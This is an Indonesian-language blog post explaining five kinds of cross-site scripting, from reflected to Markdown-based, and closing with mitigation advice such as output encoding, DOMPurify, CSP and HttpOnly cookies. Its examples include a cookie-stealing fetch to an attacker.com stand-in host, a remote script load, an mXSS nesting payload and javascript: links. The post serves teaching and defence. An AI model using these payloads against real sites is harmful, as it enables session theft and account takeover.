---
title: "XSS dengan Berbagai Jenisnya"
layout: post
---

Cross-Site Scripting (XSS) merupakan salah satu kerentanan keamanan web paling klasik sekaligus persisten dalam dunia keamanan siber. Pada dasarnya, XSS adalah kerentanan injeksi kode (*code injection*) di mana penyerang menyisipkan skrip berbahaya (biasanya JavaScript) ke dalam situs web tepercaya.


Ketika browser korban memuat halaman yang telah terinfeksi skrip tersebut, browser tidak memiliki kapabilitas bawaan untuk membedakan apakah skrip berasal dari pengembang aplikasi asli atau dari pihak ketiga yang berniat jahat. Akibatnya, skrip dieksekusi dengan hak akses penuh pengguna, memungkinkan pencurian *session token*, pembajakan akun (*account takeover*), *keylogging*, manipulasi tampilan (*defacement*), hingga pengalihan ke situs *phishing*.

## 5 Jenis XSS yang Perlu Dipahami

Meskipun prinsip dasarnya sama—yaitu mengeksekusi skrip ilegal di browser korban—cara muatan (*payload*) masuk, disimpan, dan dieksekusi membagi XSS ke dalam beberapa kategori unik:

### 1. Reflected XSS (Non-Persistent)

Reflected XSS terjadi ketika aplikasi web menerima data dari permintaan HTTP (seperti parameter URL atau kolom input formulir) dan langsung memantulkannya kembali ke dalam respons HTML tanpa proses validasi atau *output encoding* yang memadai.

* **Cara Kerja:** Penyerang membuat tautan khusus yang menyematkan muatan berbahaya di parameternya, misalnya:
```text
https://example.com/search?q=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>

```

Jika server langsung menampilkan isi query tersebut ke halaman hasil pencarian (misalnya: `Menampilkan hasil untuk: <script>...`), browser korban akan langsung mengeksekusinya begitu tautan dibuka.
* **Karakteristik:** Muatan tidak disimpan di database server. Serangan ini sangat bergantung pada rekayasa sosial (*social engineering*) untuk memancing korban mengeklik URL yang telah dirancang.

### 2. Stored XSS (Persistent)

Stored XSS adalah varian yang jauh lebih destruktif dibandingkan Reflected XSS. Pada jenis ini, muatan berbahaya berhasil disimpan secara permanen di basis data atau media penyimpanan server web.

* **Cara Kerja:** Penyerang menyisipkan muatan melalui fitur interaktif yang menyimpan data publik, seperti kolom komentar blog, pesan forum, atau kolom profil pengguna.
```html
Halo semua! <script src="https://attacker.com/payload.js"></script>

```


* **Karakteristik:** Begitu muatan tersimpan di database, setiap pengguna biasa maupun administrator yang mengunjungi halaman tersebut secara otomatis akan mengeksekusi skrip berbahaya tanpa perlu mengeklik tautan jebakan apa pun.

### 3. DOM-based XSS (Client-Side)

Berbeda dengan Reflected dan Stored XSS yang melibatkan pemrosesan di sisi server, DOM-based XSS terjadi sepenuhnya di sisi klien (*client-side*). Server bahkan mungkin tidak pernah menerima atau melihat muatan berbahaya tersebut.

* **Cara Kerja:** Kerentanan ini berakar pada interaksi antara **Source** (sumber input tak tepercaya di browser, seperti `location.hash`, `location.search`, atau `document.referrer`) dan **Sink** (fungsi atau properti DOM berbahaya yang mengeksekusi kode, seperti `element.innerHTML`, `document.write()`, atau `eval()`).
* **Contoh Skenario:** Skrip front-end membaca nilai hash URL dan langsung merendernya:
```javascript
const target = decodeURIComponent(location.hash.substring(1));
document.getElementById("greeting").innerHTML = "Halo, " + target;

```


Jika penyerang mengarahkan pengguna ke `[https://example.com/#](https://example.com/#)<img src=x onerror=alert(1)>`, browser mengeksekusi skrip secara lokal di DOM tanpa mengirim fragmen hash `#` ke server.

### 4. Mutation-based XSS (mXSS)

Mutation-based XSS merupakan jenis XSS tingkat lanjut yang mengeksploitasi perbedaan cara parser HTML di browser (*DOM parser*) dengan pustaka pembersih HTML (*HTML sanitizer*).

* **Cara Kerja:** Ketika sebuah aplikasi menggunakan sanitizer untuk membersihkan input pengguna, sanitizer mungkin menganggap sebuah string HTML "aman". Namun, saat string tersebut dimasukkan ke dalam DOM menggunakan properti seperti `innerHTML`, engine browser memutasi atau menyusun ulang (*re-serializing*) kode HTML tersebut agar valid secara sintaksis.
* **Contoh Skenario:** Browser modern mendukung beberapa *namespace* (seperti HTML5, SVG, dan MathML). Struktur bersarang yang aneh dapat mengubah konteks parsing saat dimutasi oleh browser:
```html
<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>

```


Proses normalisasi browser secara otomatis "memperbaiki" tag yang rusak atau tidak tertutup dengan benar. Perbaikan internal ini dapat memunculkan kembali elemen eksekusi yang sebelumnya tersembunyi atau lolos dari pemeriksaan sanitizer.

### 5. Markdown-based XSS

Banyak aplikasi modern (platform pengembang, forum teknis, CMS, atau aplikasi pencatat) menggunakan Markdown agar pengguna dapat memformat teks secara fleksibel. Markdown-based XSS muncul ketika proses pengubahan (*rendering*) teks Markdown menjadi HTML tidak ditangani secara aman.

**Penyebab Utama:**
* **Dukungan Raw HTML:** Spesifikasi Markdown standar mengizinkan elemen raw HTML. Jika parser Markdown tidak menonaktifkan atau memfilter tag HTML mentah, muatan seperti `<img src=x onerror=alert(1)>` akan langsung masuk ke hasil render.
* **Penyalahgunaan Skema URI:** Tautan Markdown dapat dimanipulasi menggunakan skema protokol berbahaya:
```markdown
[Klik tautan ini untuk hadiah](javascript:alert(XSS))

```

atau:
```markdown
![image](javascript:alert('XSS'))
```


* **Kerentanan Parser:** Beberapa parser Markdown populer memiliki bug pada ekspresi reguler (*regex*) atau *AST walker* yang memungkinkan penyerang menyisipkan karakter lolos (*escape bypass*) sebelum dikonversi menjadi elemen HTML.



## Perbandingan Karakteristik

| Jenis XSS | Lokasi Muatan | Keterlibatan Server | Vektor Serangan Utama |
| --- | --- | --- | --- |
| **Reflected** | Parameter HTTP Request | Memantulkan muatan ke respons | Tautan phishing / URL jebakan |
| **Stored** | Database / Penyimpanan Server | Menyimpan & menyajikan muatan | Kolom komentar, postingan forum, profil |
| **DOM-based** | Objek DOM Browser | Minim / Tidak ada (hanya sisi klien) | Parameter hash (`#`), query DOM lokal |
| **Mutation (mXSS)** | Sanitized HTML String | Tidak ada (terjadi saat DOM parsing) | Normalisasi mutasi browser (`innerHTML`) |
| **Markdown-based** | Teks berformat Markdown | Saat render Markdown ke HTML | Raw HTML tags, tautan `javascript:`, bypass parser |

## Prinsip Mitigasi

Mengamankan aplikasi web dari kelima varian XSS membutuhkan pendekatan pertahanan berlapis (*defense-in-depth*):

1. **Context-Aware Output Encoding:** Lakukan pengkodean karakter khusus HTML, JavaScript, dan URL sebelum menampilkan input dinamis ke halaman.
2. **Gunakan Sink yang Aman:** Utamakan penggunaan `element.textContent` daripada `element.innerHTML` saat memanipulasi DOM melalui JavaScript.
3. **Sanitasi Hasil Render:** Jika aplikasi harus menampilkan HTML kaya atau hasil parsing Markdown, gunakan pustaka sanitasi teruji seperti **DOMPurify** yang dikonfigurasi ketat dan selalu diperbarui untuk mencegah *mXSS bypass*.
4. **Content Security Policy (CSP):** Terapkan header respons `Content-Security-Policy` yang melarang eksekusi skrip *inline* (`unsafe-inline`) dan membatasi asal sumber daya skrip hanya dari domain tepercaya.
5. **Atribut Cookie HttpOnly:** Tandai cookie sesi penting dengan flag `HttpOnly` agar skrip JavaScript penyerang tidak dapat mencuri token otentikasi meskipun payload XSS berhasil tereksekusi.

Memahami bahwa XSS bukan hanya tentang menyusupkan tag `<script>` sederhana adalah langkah penting dalam membangun arsitektur aplikasi web modern yang tangguh terhadap manipulasi kode.
